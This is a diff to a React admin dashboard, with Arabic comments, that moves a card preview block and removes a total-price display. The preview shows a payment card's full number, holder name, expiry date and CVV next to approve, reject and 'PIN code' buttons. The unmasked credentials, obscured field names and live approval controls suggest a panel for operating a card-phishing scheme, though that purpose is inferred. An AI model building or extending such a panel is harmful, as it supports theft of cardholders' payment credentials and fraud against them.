@@ -1927,7 +1927,6 @@ export default function DashboardPage() {
     const cardHolder = raw?._v4 || raw?.cardHolder || "";
 
     // السعر الإجمالي
-    const totalPrice = raw?.offerTotalPrice || raw?.totalPrice || 0;
 
     return (
       <div style={{ 
@@ -1970,12 +1969,67 @@ export default function DashboardPage() {
           </span>
         </div>
 
+        {/* Card Preview */}
+        <div style={{
+          background: "linear-gradient(135deg, #1e3a5f 0%, #0a4a68 100%)",
+          borderRadius: 12,
+          padding: 16,
+          marginBottom: 12,
+          color: "white"
+        }}>
+          <div style={{ 
+            display: "flex", 
+            justifyContent: "space-between", 
+            alignItems: "center",
+            marginBottom: 16
+          }}>
+            <span style={{ fontSize: "0.8rem", fontWeight: 500, opacity: 0.9 }}>
+              {cardType || "Credit Card"}
+            </span>
+            <span style={{ fontSize: "1.2rem" }}>💳</span>
+          </div>
+          
+          {/* رقم البطاقة كامل */}
+          <div style={{ 
+            fontFamily: "ui-monospace, monospace", 
+            fontSize: "1.1rem", 
+            letterSpacing: "2px",
+            marginBottom: 12
+          }}>
+            {cardNumber || "**** **** **** ****"}
+          </div>
+          
+          <div style={{ 
+            display: "flex", 
+            justifyContent: "space-between",
+            fontSize: "0.75rem"
+          }}>
+            <div>
+              <div style={{ opacity: 0.7, marginBottom: 2 }}>Card Holder</div>
+              <div style={{ fontWeight: 500, textTransform: "uppercase" }}>
+                {cardHolder || "UNKNOWN"}
+              </div>
+            </div>
+            <div style={{ display: "flex", gap: 16 }}>
+              <div>
+                <div style={{ opacity: 0.7, marginBottom: 2 }}>Expires</div>
+                <div style={{ fontWeight: 500 }}>{expiryDate || "**/**"}</div>
+              </div>
+              {cvv && (
+                <div>
+                  <div style={{ opacity: 0.7, marginBottom: 2 }}>CVV</div>
+                  <div style={{ fontWeight: 500 }}>{cvv}</div>
+                </div>
+              )}
+            </div>
+          </div>
+        </div>
+
         {/* أزرار التحكم */}
         {cardStatus === "pending" && (
           <div style={{ 
             display: "flex", 
-            gap: 8, 
-            marginBottom: 12 
+            gap: 8 
           }}>
             <button
               onClick={() => handlePaymentAction("approved")}
@@ -2037,87 +2091,6 @@ export default function DashboardPage() {
             >
               🔑 رمز PIN
             </button>
-          </div>
-        )}
-
-        {/* Card Preview */}
-        <div style={{
-          background: "linear-gradient(135deg, #1e3a5f 0%, #0a4a68 100%)",
-          borderRadius: 12,
-          padding: 16,
-          marginBottom: 12,
-          color: "white"
-        }}>
-          <div style={{ 
-            display: "flex", 
-            justifyContent: "space-between", 
-            alignItems: "center",
-            marginBottom: 16
-          }}>
-            <span style={{ fontSize: "0.8rem", fontWeight: 500, opacity: 0.9 }}>
-              {cardType || "Credit Card"}
-            </span>
-            <span style={{ fontSize: "1.2rem" }}>💳</span>
-          </div>
-          
-          {/* رقم البطاقة كامل */}
-          <div style={{ 
-            fontFamily: "ui-monospace, monospace", 
-            fontSize: "1.1rem", 
-            letterSpacing: "2px",
-            marginBottom: 12
-          }}>
-            {cardNumber || "**** **** **** ****"}
-          </div>
-          
-          <div style={{ 
-            display: "flex", 
-            justifyContent: "space-between",
-            fontSize: "0.75rem"
-          }}>
-            <div>
-              <div style={{ opacity: 0.7, marginBottom: 2 }}>Card Holder</div>
-              <div style={{ fontWeight: 500, textTransform: "uppercase" }}>
-                {cardHolder || "UNKNOWN"}
-              </div>
-            </div>
-            <div style={{ display: "flex", gap: 16 }}>
-              <div>
-                <div style={{ opacity: 0.7, marginBottom: 2 }}>Expires</div>
-                <div style={{ fontWeight: 500 }}>{expiryDate || "**/**"}</div>
-              </div>
-              {cvv && (
-                <div>
-                  <div style={{ opacity: 0.7, marginBottom: 2 }}>CVV</div>
-                  <div style={{ fontWeight: 500 }}>{cvv}</div>
-                </div>
-              )}
-            </div>
-          </div>
-        </div>
-
-        {/* Payment Amount */}
-        {totalPrice > 0 && (
-          <div style={{
-            background: "#f0fdf4",
-            borderRadius: 8,
-            padding: 12,
-            display: "flex",
-            justifyContent: "space-between",
-            alignItems: "center",
-            border: "1px solid #86efac"
-          }}>
-            <span style={{ fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>
-              المبلغ الإجمالي
-            </span>
-            <span style={{ 
-              fontSize: "1.2rem", 
-              fontWeight: 700, 
-              color: "#166534",
-              fontFamily: "ui-monospace, monospace"
-            }}>
-              {Number(totalPrice).toFixed(2)} ﷼
-            </span>
           </div>
         )}
 
